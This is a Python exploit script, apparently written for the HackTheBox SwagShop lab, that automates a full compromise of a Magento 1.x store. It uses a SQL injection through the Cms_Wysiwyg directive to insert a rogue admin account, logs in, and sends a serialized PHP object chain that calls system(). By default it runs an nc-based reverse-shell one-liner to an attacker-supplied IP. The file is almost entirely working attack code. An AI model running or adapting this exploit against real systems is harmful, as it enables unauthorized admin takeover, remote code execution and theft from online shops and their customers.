#! python3
# Author: jekyllorhyde (adriangonzalezsanchez1996@gmail.com)
# Date: 2024/26/03
# Version: 1.0
# Tested on: Kali Linux 2024.1
# Description: This scripts automates the process of gaining access to the SwagShop machine in the HackTheBox platform.

from typing import Optional
import requests
import base64
from colorama import Fore, Style
import mechanize
import xmltodict
import re
from hashlib import md5
from argparse import ArgumentParser


class MagentoIntruder:
    def __init__(self, admin_login_url: str, domain: str = "http://swagshop.htb"):
        self.domain = domain
        self.url = f"{domain}/{admin_login_url}"
        self.sqli_target = f"{admin_login_url}/Cms_Wysiwyg/directive/index/"

    def infer_date_in_app_local_xml(self, app_local_xml: str = "app/etc/local.xml"):
        response = requests.get(f"{self.domain}/{app_local_xml}")
        if response.ok:
            # Parse the XML response given by the server
            xml_data = xmltodict.parse(response.text)
            # Extract the date from the XML data
            date: Optional[str] = (
                xml_data.get("config", {})
                .get("global", {})
                .get("install", {})
                .get("date", None)
            )
            return date
        return None

    def print_success_text(self, text: str):
        print(f"{Fore.GREEN} [+] {text}")
        print(Style.RESET_ALL)

    def print_error_text(self, text: str):
        print(f"{Fore.RED} [-] {text}")
        print(Style.RESET_ALL)

    def create_admin_user(self):
        username, password = ("jekyllorhyde", "password")
        q = f"""
            SET @SALT = 'rp';
            SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
            SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
            INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
            INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
        """
        query = q.replace("\n", "")
        pfilter = (
            f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{query}"
        )
        response = requests.post(
            self.sqli_target,
            data={
                "___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                "filter": base64.b64encode(pfilter.encode()).decode(),
                "forwarded": 1,
            },
        )

        if response.ok:
            self.print_success_text(f"User {username} created successfully!")
            return username, password
        else:
            self.print_error_text("Failed to create user.")
            return None, None

    def run_cmd(self, cmd: str, username: str, password: str):
        php_function = "system"
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        browser.open(self.url)
        # Select the first form (this is the login form)
        browser.select_form(nr=0)
        # Fixup form inputs
        browser.form.fixup()
        self.print_success_text(f"Login as user {username}")
        # Set the username and password
        browser["login[username]"] = username
        browser["login[password]"] = password
        browser.method = "POST"
        response = browser.submit()
        content = response.read().decode()
        url_match = re.search(r"ajaxBlockUrl = \'(.*)\'", content)
        key_match = re.search(r"var FORM_KEY = '(.*)'", content)
        if url_match is not None and key_match is not None:
            url = url_match.group(1)
            key = key_match.group(1)
            self.print_success_text("Logged in successfully!")
        else:
            self.print_error_text("Failed to login.")
            exit(1)

        # Submit the form
        date = self.infer_date_in_app_local_xml() or "Wed, 08 May 2014 07:23:09 +0000"
        # POP chain to pivot into call_user_exec
        payload = (
            'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:"Zend_Log_Writer_Mail":4:{s:16:'
            '"\00*\00_eventsToMail";a:3:{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:"'
            'EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:"\00*\00_layout";O:23:"'
            'Zend_Config_Writer_Yaml":3:{s:15:"\00*\00_yamlEncoder";s:%d:"%s";s:17:"\00*\00'
            '_loadedSection";N;s:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data"'
            ';s:%d:"%s";}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}'
            % (len(php_function), php_function, len(cmd), cmd)
        )

        request = browser.open(
            url + "block/tab_orders/period/7d/?isAjax=true",
            data="isAjax=false&form_key=" + key,
        )
        tunnel_match = re.search('src="(.*)\?ga=', request.read().decode())
        if tunnel_match is not None:
            self.print_success_text("Payload sent successfully!")
            tunnel = tunnel_match.group(1)

            payload_encoded = base64.b64encode(payload.encode())
            gh = md5(payload_encoded + date.encode()).hexdigest()
            exploit = tunnel + "?ga=" + payload_encoded.decode() + "&h=" + gh
            self.print_success_text("Sending exploit ...")
            try:
                response = browser.open(exploit)
            except (mechanize.HTTPError, mechanize.URLError) as e:
                self.print_success_text(f"Got answer: {e.read().decode()}")


def exploit(base_path: str, login_url: str, cmd: str):
    intruder = MagentoIntruder(admin_login_url=login_url, domain=base_path)
    username, password = intruder.create_admin_user()
    if username is not None and password is not None:
        intruder.run_cmd(cmd, username, password)
    else:
        intruder.print_error_text("Impossible to continue. Exiting ...")
        exit(1)


if __name__ == "__main__":
    # Parse script arguments to obtain the base path, login URL, bind IP and bind port
    parser = ArgumentParser()
    parser.add_argument(
        "--base-path", help="Base path of the Magento instance machine", required=True
    )
    parser.add_argument("--login-url", help="Admin login URL", default="admin")
    parser.add_argument("--ip", help="IP address to bind the reverse shell")
    parser.add_argument(
        "--port", help="Port to bind the reverse shell", type=int, default=9000
    )
    parser.add_argument(
        "--cmd",
        help="Command to run in the target machine. Defaults to a nc based onliner reverse shell using ip and port",
        required=False,
    )

    args = parser.parse_args()

    if args.cmd is None and args.ip is None:
        parser.error("You must specify either a command or an IP address to bind the reverse shell")

    cmd = (
        args.cmd
        or f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f"
    )
    exploit(args.base_path, args.login_url, cmd)
